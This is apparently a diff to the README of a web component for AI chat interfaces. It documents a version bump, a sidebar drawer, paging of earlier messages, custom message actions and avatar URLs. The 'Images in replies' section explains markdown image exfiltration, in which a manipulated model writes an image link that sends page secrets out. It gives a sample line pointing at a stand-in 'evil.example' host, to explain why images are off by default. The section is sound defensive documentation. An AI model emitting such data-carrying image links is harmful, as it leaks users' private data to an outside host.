@@ -20,7 +20,7 @@ tweak it, and copy the generated code straight into your app.
 - ♿ **Accessible** — polite screen-reader announcement of each settled reply
   (no token-by-token spam), a keyboard focus ring, focus that never gets dropped,
   full keyboard support, and respects `prefers-reduced-motion`
-- 📦 **~91 KB gzipped**, zero peer dependencies
+- 📦 **~98 KB gzipped**, zero peer dependencies
 
 ---
 
@@ -100,8 +100,8 @@ server-backed pattern above. See [Transports](#transports).
 <script type="module">
   // Pin the version so a future release can't change your page unannounced.
   // Drop the @0.3.0 to always get the latest (fine for a quick try, not prod).
-  import 'https://esm.sh/ai-chat-element@0.3.0';
-  import { openAIAdapter } from 'https://esm.sh/ai-chat-element@0.3.0';
+  import 'https://esm.sh/ai-chat-element@0.5.0';
+  import { openAIAdapter } from 'https://esm.sh/ai-chat-element@0.5.0';
 
   const chat = document.querySelector('ai-chat');
   // Local, keyless example: talk to Ollama running on your machine.
@@ -215,8 +215,9 @@ import { CUSTOM_ELEMENTS_SCHEMA } from '@angular/core';
 @Component({
   standalone: true,
   schemas: [CUSTOM_ELEMENTS_SCHEMA], // <- required so Angular allows <ai-chat>
-  // Custom events (colon names) bind fine in the template:
-  template: `<ai-chat #chat theme="light" (ai-chat:message)="onMessage($event)"></ai-chat>`,
+  // Bind the dash form of an event: Angular reads `(ai-chat:message)` as a
+  // global target (like `window:resize`) and refuses to compile it.
+  template: `<ai-chat #chat theme="light" (ai-chat-message)="onMessage($event)"></ai-chat>`,
 })
 export class ChatComponent implements AfterViewInit {
   @ViewChild('chat') chat!: ElementRef;
@@ -331,6 +332,9 @@ const upstream = await fetch('https://api.openai.com/v1/chat/completions', {
 | `show-edit`        | boolean                     | `false` | Show an Edit button on **user** messages; confirming fires `ai-chat:message-edit`. |
 | `show-aside`       | boolean                     | `false` | Show the sidebar column (fill the `aside` slot with your history list).           |
 | `aside-side`       | `left` \| `right`           | `left`  | Which side the sidebar sits on.                                                   |
+| `aside-breakpoint` | number (px)                 | `560`   | Below this width **of the chat itself**, the sidebar becomes a drawer opened by a toggle. `0` never collapses. See [On a narrow chat](#on-a-narrow-chat-the-sidebar-is-a-drawer). |
+| `aside-open`       | boolean                     | `false` | Whether the drawer is open (narrow chat only). Set it from your own button; reflected. |
+| `hide-aside-toggle`| boolean                     | `false` | Keep the drawer but hide the built-in toggle (bring your own trigger). |
 | `system-prompt`    | string                      | —       | Prepended to every request (not shown in UI).                                     |
 | `disabled`         | boolean                     | `false` | Disables the input.                                                               |
 | `allow-attachments`| boolean                     | `false` | Enable file/image attachments (attach button + drag-drop + paste). See [Attachments](#attachments). |
@@ -340,6 +344,12 @@ const upstream = await fetch('https://api.openai.com/v1/chat/completions', {
 | `max-attachment-size` | number (bytes)           | `0`     | Max size per file; `0` = no cap.                                                  |
 | `conversation-id`  | string                      | —       | Your key for the conversation on screen. Echoed back on `ai-chat:background-message` so you know which conversation a background reply belongs to. See [Background streaming](#background-streaming). |
 | `abort-on-switch`  | boolean                     | `false` | Cancel an in-flight reply when the conversation is switched or cleared, instead of letting it finish in the background. |
+| `allow-images`     | boolean                     | `false` | Render images inside replies. Off, an image shows as its alt text and nothing in a reply loads a URL. See [Images in replies](#images-in-replies). |
+| `assistant-avatar-src` | string (URL)            | —       | Image for the assistant's avatar on every reply. Wins over the `assistant-avatar` slot. |
+| `user-avatar-src`  | string (URL)                | —       | Image for the user's avatar on every user message. Wins over the `user-avatar` slot. |
+| `has-earlier`      | boolean                     | `false` | There are older messages than `.messages` holds: shows "Load earlier messages" at the top and fires `ai-chat:load-earlier`. See [Long conversations](#long-conversations-load-earlier). |
+| `load-earlier`     | `scroll` \| `button`        | `scroll` | With `has-earlier`: `scroll` loads as the reader nears the top (the button is there too, for keyboard users); `button` loads only on a click. |
+| `image-hosts`      | string (space-separated)    | —       | With `allow-images`, the URL prefixes images may load from (e.g. `https://cdn.example.com/`). Only `https:` ever loads. Also settable as an array property `.imageHosts`. |
 
 To turn a boolean attribute off, set it to `"false"` (e.g. `show-timestamps="false"`).
 
@@ -350,6 +360,8 @@ Set via JS only (they hold objects/arrays):
 | `.transport` | `ChatTransport`       | **Required.** The backend to talk to.              |
 | `.messages`  | `ChatMessage[]`       | The conversation (read or seed it).                |
 | `.labels`    | `Partial<ChatLabels>` | Override any UI/accessibility strings (see below). |
+| `.messageActions` | `(message: ChatMessage) => MessageAction[]` | Your own buttons in each message's actions row. See [Message actions](#message-actions-copy--edit). |
+| `.imageHosts` | `string[]`           | Same as the `image-hosts` attribute. |
 
 **Methods:**
 
@@ -361,9 +373,13 @@ Set via JS only (they hold objects/arrays):
 | `stop()`                  | `void`               | Aborts the in-flight stream, if any. Always cancels — unlike a conversation switch, this is the user saying they don't want the reply. |
 | `clear()`                 | `void`               | Empties the conversation and the composer draft. An in-flight reply keeps generating in the background (see [Background streaming](#background-streaming)) unless `abort-on-switch` is set. |
 | `openFilePicker()`        | `void`               | Opens the native file picker (for use with `hide-attach-button` + your own trigger). No-op unless `allow-attachments` is set. |
+| `prependMessages(older)`  | `Promise<void>`      | Adds older messages **above** the conversation — your answer to `ai-chat:load-earlier` — keeping what the reader sees in place. Call it with `[]` when nothing came back (or the load failed) to re-enable the control. |
 | `isGenerating(id)`        | `boolean`            | Whether the conversation with that `conversation-id` has a reply still generating in the background. Use it to mark a row in your history list. |
 
-**Events** (all `bubbles: true, composed: true`; read `e.detail`):
+**Events** (all `bubbles: true, composed: true`; read `e.detail`). Each also
+fires with a dash instead of the colon — `ai-chat-message`, `ai-chat-new-chat`,
+… — same detail; cancelling either cancels both. Use the dash form in
+framework templates (Angular can't bind a colon name).
 
 | Event             | `detail`                    | When / notes                                                        |
 | ----------------- | --------------------------- | ------------------------------------------------------------------- |
@@ -375,6 +391,9 @@ Set via JS only (they hold objects/arrays):
 | `ai-chat:attach-rejected` | `{ file: File, reason: 'type' \| 'size' \| 'too-many', message: string }` | Fires when a picked file is rejected by `accept` / `max-attachment-size` / `max-attachments`. |
 | `ai-chat:message-edit` | `{ index: number, message: ChatMessage, newContent: string }` | Fires when the user confirms an inline edit (`show-edit`, user messages only). **The component does not change `.messages`** — you decide what edit means. The usual ChatGPT behaviour is to truncate from `index` and resend `newContent`. |
 | `ai-chat:preview` | `{ attachment: Attachment }` | Fires when an image (staged in the composer or already sent) is clicked. **Cancelable** — `e.preventDefault()` suppresses the built-in overlay so you can open your own lightbox/gallery. |
+| `ai-chat:aside-toggle` | `{ open: boolean }` | The reader opened or closed the sidebar drawer (toggle, backdrop, Esc, or a conversation switch). |
+| `ai-chat:message-action` | `{ actionId: string, message: ChatMessage, index: number }` | One of your `messageActions` buttons was pressed. |
+| `ai-chat:load-earlier` | `{ conversationId: string \| null, oldest: ChatMessage }` | The reader asked for older messages (`has-earlier`): scrolled near the top, or pressed the button. Fires once until you call `prependMessages()`. `oldest` is your paging cursor. |
 | `ai-chat:background-message` | `{ conversationId: string \| null, message: ChatMessage, done: boolean }` | A reply is still streaming for a conversation you've switched away from. Fires per token with `done: false`, then once with `done: true` when it settles (including on error — check `message.error`). `conversationId` is whatever `conversation-id` held when that turn was sent. See [Background streaming](#background-streaming). |
 
 `ai-chat:message` fires once per completed assistant turn — but **only when the
@@ -445,8 +464,22 @@ chat.labels = { userName: 'You', assistantName: 'Acme Assistant' };
 </ai-chat>
 ```
 
+For a picture, the simplest is a URL — no slot needed:
+
+```html
+<ai-chat assistant-avatar-src="/bot.png" user-avatar-src="/me.png"></ai-chat>
+```
+
+> **Slotted avatars are cloned.** One slotted node can't appear in every
+> message, so each message gets a **copy** inside the shadow DOM — where your
+> page's CSS can't reach. Plain `<img>`, initials and self-styled inline SVG
+> work; a framework component styled by page CSS (an Angular/React avatar
+> component) renders **blank**. Use `assistant-avatar-src` / `user-avatar-src`
+> for those, or slot an `<img>` of it. The tile behind the picture is
+> `--ai-chat-avatar-bg` (`transparent` for a shaped picture).
+
 Other slots: `send-icon`, `stop-icon`, `jump-icon`, `clear-icon`, `retry-icon`,
-`error-icon`, `empty-icon`, `empty` (replace the whole empty state), `header`
+`error-icon`, `empty-icon`, `aside-toggle-icon`, `empty` (replace the whole empty state), `header`
 (replace the whole top bar), `aside` (the history sidebar), and
 `composer-actions-start` / `composer-actions-end` (drop buttons into the input's
 action row — see below).
@@ -531,6 +564,30 @@ chat.addEventListener('ai-chat:message-edit', (e) => {
 Prefer editing in place, or branching the conversation instead? Handle the event
 however you like — that's the point of it being a hook rather than a behaviour.
 
+**Your own actions.** Add buttons to the row — "Download as Excel", "Regenerate",
+thumbs up/down — with `messageActions`, a function called per message that
+returns the buttons for it (or `[]`). Pressing one fires `ai-chat:message-action`:
+
+```js
+const excel = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0-4-4m4 4 4-4M5 21h14"/></svg>';
+
+chat.messageActions = (message) =>
+  message.role === 'assistant' && message.content.includes('|')
+    ? [{ id: 'excel', label: 'Download as Excel', icon: excel }]
+    : [];
+
+chat.addEventListener('ai-chat:message-action', (e) => {
+  const { actionId, message, index } = e.detail;
+  if (actionId === 'excel') downloadExcel(message);
+});
+```
+
+Each action is `{ id, label, icon?, disabled? }`: `label` is the tooltip and
+accessible name (and the visible text when there's no `icon`); `icon` is SVG
+markup (sanitized; `currentColor` follows the theme). The function runs on every
+render of the row, so assign a new one when what it returns depends on state that
+changed. Style them with `::part(custom-action)`.
+
 Turn copy off with `show-copy="false"`; restyle both via the `action-button`,
 `copy-button` and `edit-button` parts, swap the icons with the `copy-icon` /
 `edit-icon` slots, and rename the strings via the `copyMessage`, `edit`,
@@ -552,6 +609,7 @@ exactly what you need to build a ChatGPT-style history yourself:
   `detail.messages` is the outgoing conversation, so you can save it before the
   component clears itself. (Call `preventDefault()` to keep the messages.)
 - Switch conversations by setting **`chat.messages = savedConversation`**.
+- On a narrow chat the sidebar becomes a **drawer** — see below.
 
 That's the whole pattern — a minimal history in ~20 lines:
 
@@ -607,6 +665,71 @@ right, and `--ai-chat-aside-width` / `--ai-chat-aside-bg` to size and color it.
 
 ---
 
+## Long conversations (load earlier)
+
+For a long conversation, show only the newest messages and load older ones as
+the reader scrolls up — the way ChatGPT and Claude do. The component handles the
+scrolling and keeps the reader's place; **you** own the storage and the paging,
+so it works with any backend.
+
+```js
+const chat = document.querySelector('ai-chat');
+
+// Open a conversation with its newest page.
+const page = await api.messages(conversationId, { limit: 30 });
+chat.conversationId = conversationId;
+chat.messages = page.messages;
+chat.hasEarlier = page.hasMore;
+
+// The reader scrolled near the top (or pressed "Load earlier messages").
+chat.addEventListener('ai-chat:load-earlier', async (e) => {
+  try {
+    const older = await api.messages(e.detail.conversationId, {
+      before: e.detail.oldest.id, // your cursor
+      limit: 30,
+    });
+    await chat.prependMessages(older.messages);
+    chat.hasEarlier = older.hasMore;
+  } catch {
+    await chat.prependMessages([]); // re-enables the control so they can try again
+  }
+});
+```
+
+- **`has-earlier`** turns it on; clear it when you reach the first message.
+- **`load-earlier="button"`** loads only when the button is pressed. The default,
+  `scroll`, also loads as the reader nears the top — and keeps loading while the
+  history is too short to fill the view.
+- `ai-chat:load-earlier` fires **once** until you call `prependMessages()`, so a
+  fast scroll never sends duplicate requests. If the conversation on screen
+  changes (`conversation-id` or `.messages`) before you answer, the pending load
+  is dropped.
+- Message `id`s must be unique: the list is keyed by them, so existing messages
+  keep their DOM when older ones are added above.
+- Style it with `::part(load-earlier)` (the button) and `::part(load-earlier-row)`;
+  translate it with the `loadEarlier` / `loadingEarlier` labels.
+
+### On a narrow chat, the sidebar is a drawer
+
+Below `aside-breakpoint` (560px by default) **of the chat's own width** — so a
+phone, but also a narrow panel on a desktop — the sidebar would crush the
+conversation. It slides over it instead, opened by a built-in toggle in the
+header (or floating top-left without one). The backdrop, Esc, or switching
+conversation (`conversation-id` changing) closes it; keyboard focus moves into
+the drawer and back to the toggle.
+
+```html
+<ai-chat show-aside show-header aside-breakpoint="640"></ai-chat>
+```
+
+Drive it yourself with `aside-open` — e.g. from your own "Chats" button, with
+`hide-aside-toggle` to drop the built-in one — and listen to
+`ai-chat:aside-toggle` `{ open }` to follow it. Close it when the reader picks a
+conversation if you don't set `conversation-id`: `chat.asideOpen = false`.
+Style it with `--ai-chat-aside-drawer-bg`, `--ai-chat-aside-scrim`,
+`::part(aside-toggle)` and `::part(aside-scrim)`; swap the icon with the
+`aside-toggle-icon` slot; rename it with the `openAside` / `closeAside` labels.
+
 ## Background streaming
 
 Switching conversations while the AI is still answering does **not** cancel the
@@ -639,7 +762,10 @@ chat.addEventListener('ai-chat:background-message', (e) => {
 ```
 
 Use `chat.isGenerating(id)` to mark a row in your history list as still working —
-the playground shows a small pulsing dot.
+the playground shows a small pulsing dot. Update that marker **in place** on the
+per-token events; don't rebuild the list DOM per token, or a token landing
+between mousedown and mouseup replaces the row under the cursor and the click is
+lost (the playground's `syncDots()` shows the pattern).
 
 Details worth knowing:
 
@@ -718,6 +844,26 @@ Configure it:
 | `accept`              | `image/*` | Allowed file types (standard `accept` syntax: `image/*`, `.pdf`, `image/png,application/pdf`, `*`). |
 | `max-attachments`     | `5`       | Max files per message.                         |
 | `max-attachment-size` | `0`       | Max bytes per file (`0` = no cap).             |
+
+### Images in replies
+
+A reply is model output, and a model can be talked into writing anything —
+including an image whose URL carries data out of the page the moment it shows
+(`![](https://evil.example/?d=<secret>)`, "markdown image exfiltration"). So by
+default **nothing in a rendered message loads a URL by itself**: images show as
+their alt text, and `style` attributes and tags, `srcset`, media, SVG images and
+image inputs are stripped. Links get `rel="noopener noreferrer"`.
+
+If your replies genuinely need pictures, opt in and allowlist where they may
+come from:
+
+```html
+<ai-chat allow-images image-hosts="https://cdn.example.com/ https://images.example.org/assets/"></ai-chat>
+```
+
+Only `https:` URLs that start with one of the prefixes load, and they load with
+`referrerpolicy="no-referrer"`. `allow-images` without `image-hosts` allows any
+`https:` image — only do that if you trust everything your model reads.
 
 ### Paste/drag without the button
 
@@ -798,6 +944,12 @@ chat.labels = {
   // Image preview ({name} is replaced with the file name):
   previewImage: 'Ver {name}',
   closePreview: 'Cerrar vista previa',
+  // Top of a long conversation (has-earlier):
+  loadEarlier: 'Cargar mensajes anteriores',
+  loadingEarlier: 'Cargando mensajes anteriores…',
+  // The sidebar drawer on a narrow chat:
+  openAside: 'Mostrar conversaciones',
+  closeAside: 'Ocultar conversaciones',
   // Attachment strings ({name} is replaced with the filename):
   attach: 'Adjuntar archivos',
   removeAttachment: 'Quitar adjunto',
@@ -915,7 +1067,27 @@ never on a mouse click. Subtle by default; tune it to taste.
 | `--ai-chat-composer-border-width` | `0`              | Divider above the composer        |
 | `--ai-chat-header-border-width`   | `= border-width` | Divider under the header          |
 | `--ai-chat-code-border-width`     | `= border-width` | Code block border                 |
-| `--ai-chat-table-border-width`    | `= border-width` | Markdown table borders            |
+| `--ai-chat-table-border-width`    | `= border-width` | Markdown table frame and row rules |
+
+**Reply content** (markdown in replies; defaults derive from the palette, so dark mode follows)
+
+| Variable                        | Default                     | Controls                                      |
+| ------------------------------- | --------------------------- | --------------------------------------------- |
+| `--ai-chat-table-header-bg`     | `fg 5%`                     | Table header row background                   |
+| `--ai-chat-table-header-fg`     | `= muted`                   | Table header text                             |
+| `--ai-chat-table-row-divider`   | `= border`                  | Rule between table rows (no vertical rules)   |
+| `--ai-chat-table-stripe-bg`     | `transparent`               | Every other body row (set a tint for stripes) |
+| `--ai-chat-table-cell-padding`  | `6px 12px`                  | Table cell padding                            |
+| `--ai-chat-table-radius`        | `= radius-sm`               | Table outer frame corners                     |
+| `--ai-chat-link-color`          | `= accent`                  | Links                                         |
+| `--ai-chat-link-hover-color`    | `accent 75% + fg`           | Links on hover                                |
+| `--ai-chat-strong-fg`           | `inherit`                   | **Bold** text                                 |
+| `--ai-chat-heading-fg`          | `inherit`                   | Headings (h1-h6, sized for a chat reply)      |
+| `--ai-chat-marker-color`        | `= muted`                   | List bullets and numbers                      |
+| `--ai-chat-blockquote-border`   | `= border`                  | Blockquote left rule                          |
+
+Tables use tabular numerals so money and counts line up, and honour markdown
+column alignment (`|--:|` right-aligns a number column).
 
 **Corner radius** (all inherit `--ai-chat-radius`)
 
@@ -950,6 +1122,7 @@ never on a mouse click. Subtle by default; tune it to taste.
 | `--ai-chat-max-width`        | `760px`           | Max width of messages + composer               |
 | `--ai-chat-gap`              | `16px`            | Vertical space between messages                |
 | `--ai-chat-avatar-size`      | `32px`            | Avatar width/height                            |
+| `--ai-chat-avatar-bg`        | `= assistant-bg`  | Avatar tile behind the picture (`transparent` for a shaped picture) |
 | `--ai-chat-button-size`      | `42px`            | Header/floating icon buttons                   |
 | `--ai-chat-send-size`        | `34px`            | Send/stop button inside the composer           |
 | `--ai-chat-clear-size`       | `32px`            | Compact New-chat icon button (header/floating) |
@@ -974,6 +1147,7 @@ never on a mouse click. Subtle by default; tune it to taste.
 | `--ai-chat-bubble-padding`   | `6px = inset-x`  | Inside message bubbles (horizontal derives from `bubble-inset-x`) |
 | `--ai-chat-input-padding`    | `8px 14px 2px`   | Inside the textarea     |
 | `--ai-chat-messages-padding` | `20px 16px`      | Around the message list |
+| `--ai-chat-messages-scrollbar-gutter` | `stable` | Reserve the scrollbar's width in the message list (`auto` gives it back when nothing scrolls) |
 | `--ai-chat-composer-padding` | `12px 16px 16px` | Around the composer     |
 | `--ai-chat-header-padding`   | `10px 16px`      | Inside the header bar   |
 
@@ -984,6 +1158,9 @@ never on a mouse click. Subtle by default; tune it to taste.
 | `--ai-chat-aside-width`   | `260px`       | Sidebar column width |
 | `--ai-chat-aside-bg`      | `transparent` | Sidebar background   |
 | `--ai-chat-aside-padding` | `12px`        | Inside the sidebar   |
+| `--ai-chat-aside-drawer-bg` | `= bg`        | The drawer's surface on a narrow chat |
+| `--ai-chat-aside-scrim` | `rgb(0 0 0 / 0.3)` | Backdrop behind the open drawer |
+| `--ai-chat-aside-scrollbar-gutter` | `auto` | Reserve the scrollbar's width in the history list (`stable` keeps it) |
 
 ### All `::part()` hooks
 
@@ -999,8 +1176,8 @@ For styling that a variable can't reach, target the shadow parts with
 `composer-box`, `composer-attachments`, `attachment-chip`, `attachment-remove`,
 `composer-actions`, `composer-actions-start`,
 `composer-actions-end`, `attach-button`, `input`, `send-button`, `stop-button`,
-`jump-button`, `retry-button`, `empty`, `empty-icon`, `empty-heading`,
-`empty-body`, `error`, `empty-response`.
+`jump-button`, `retry-button`, `aside-toggle`, `aside-scrim`, `custom-action`, `load-earlier`, `load-earlier-row`, `empty`,
+`empty-icon`, `empty-heading`, `empty-body`, `error`, `empty-response`.
 
 `message-actions` is the per-message actions row; `action-button` targets every
 button in it, with `copy-button` / `edit-button` for the built-ins specifically.
@@ -1031,6 +1208,7 @@ Put your own markup in any of these (`<x slot="name">`):
 | `assistant-avatar` / `user-avatar` | Avatar for each side (opt-in; column hides if empty)                  |
 | `header`                           | The entire top bar                                                    |
 | `aside`                            | Your conversation-history list (the sidebar body)                     |
+| `aside-toggle-icon`                | Icon of the drawer toggle on a narrow chat                            |
 | `empty`                            | The whole empty state                                                 |
 | `empty-icon`                       | The empty-state icon (defaults to a chat-bubble SVG; slot to replace) |
 | `composer-actions-start`           | Buttons at the left of the input's action row                         |
@@ -1057,6 +1235,7 @@ import type {
   FinishReason,
   TokenUsage,
   Attachment,
+  MessageAction,
   ChatLabels,
 } from 'ai-chat-element';
 
